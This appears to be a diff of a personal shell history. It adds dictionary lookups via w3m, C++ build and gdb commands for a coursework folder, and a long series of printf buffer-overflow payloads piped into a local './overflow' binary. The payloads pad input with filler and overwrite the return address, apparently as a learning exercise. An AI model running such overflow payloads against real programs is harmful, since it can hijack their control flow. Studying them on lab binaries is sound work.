@@ -7,3 +7,108 @@ cd D
 cd D:
 dir
 exit
+ls
+printf“AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDD\xed\x83\x04\x08”
+printf"AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDD\xed\x83\x04\x08"
+printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDD\xed\x83\x04\x08"
+printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCC\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDD\xed\x83\x04\x08" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDD\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDD\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDD\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDE\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "EAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDE\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "EEAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDE\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "EEEAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDE\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "EEEAAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDE\x35\x06\x40" | ./overflow 
+printf "AAAAAAAAAABBBBBBBBBB\x35\x06\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAABBBBBBBBBB\xa2\x05\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAABBBBBBBB\xa2\x05\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAABBBBBB\xa2\x05\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAA\xa2\x05\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAABBBBBBBBBBB\xa2\x05\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAABBBBBBBBBBCC\xa2\x05\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAABBBBBBBBBBCCC\xa2\x05\x40\x00\x00\x00\x00\x00" | ./overflow 
+printf "AAAAAAAAAABBBBBBBBBBCCCC\xa2\x05\x40\x00\x00\x00\x00\x00" | ./overflow 
+w3m -dump www.iciba.com/fairness |sed -n '1,20p'
+w3m -dump www.iciba.com/rare |sed -n '1,20p'
+w3m -dump www.iciba.com/rejection |sed -n '1,20p'
+w3m -dump www.iciba.com/curiously |sed -n '1,20p'
+w3m -dump www.iciba.com/passive |sed -n '1,20p'
+w3m -dump www.iciba.com/extraneous |sed -n '1,20p'
+w3m -dump www.iciba.com/fickle |sed -n '1,20p'
+w3m -dump www.iciba.com/perceptive |sed -n '1,20p'
+w3m -dump www.iciba.com/magistrate |sed -n '1,20p'
+w3m -dump www.iciba.com/inferiority |sed -n '1,20p'
+w3m -dump www.iciba.com/self-centeredness |sed -n '1,20p'
+w3m -dump www.iciba.com/all-seeing |sed -n '1,20p'
+w3m -dump www.iciba.com/impersonal |sed -n '1,20p'
+w3m -dump www.iciba.com/personally |sed -n '1,20p'
+w3m -dump www.iciba.com/judgement |sed -n '1,20p'
+w3m -dump www.iciba.com/临时 |sed -n '1,20p'
+w3m -dump www.iciba.com/trick |sed -n '1,20p'
+w3m -dump www.iciba.com/策略 |sed -n '1,20p'
+w3m -dump www.iciba.com/no_idea |sed -n '1,20p'
+ls
+cd ASSESSMENT\ No1.rar\ Folder/
+ls
+cd Permutations/
+ls
+./a.out 
+g++ main.cpp
+g++ main.cpp application.h utility.h
+g++ *.cpp
+g++ *.cpp
+g++ *.cpp
+ls
+./a.out 
+g++ *.cpp && ./a.out 
+gdb ./a.out 
+g++ -g *.cpp && ./a.out 
+gdb ./a.out 
+g++ -g *.cpp && ./a.out 
+g++ -g *.cpp && ./a.out 
+g++ -g *.cpp && ./a.out 
+g++ -g *.cpp && ./a.out 
+g++ -g *.cpp && ./a.out 
+g++ -g *.cpp && ./a.out 
+g++ -g *.cpp && ./a.out 
+g++ -g *.cpp && ./a.out 
+g++ -g *.cpp && ./a.out 
+g++ -g *.cpp && ./a.out 
+gdb a.out
+gdb a.out
+ls
+./a.out 
+./a.out 
+w3m -dump www.iciba.com/coalesce
+w3m -dump www.iciba.com/coalesce |sec -n '1,30p'
+w3m -dump www.iciba.com/coalesce |sed -n '1,30p'
+w3m -dump www.iciba.com/emit |sed -n '1,30p'
+w3m -dump www.iciba.com/tentative |sed -n '1,30p'
+w3m -dump www.iciba.com/tolerate |sed -n '1,30p'
+w3m -dump www.iciba.com/aggregate |sed -n '1,30p'
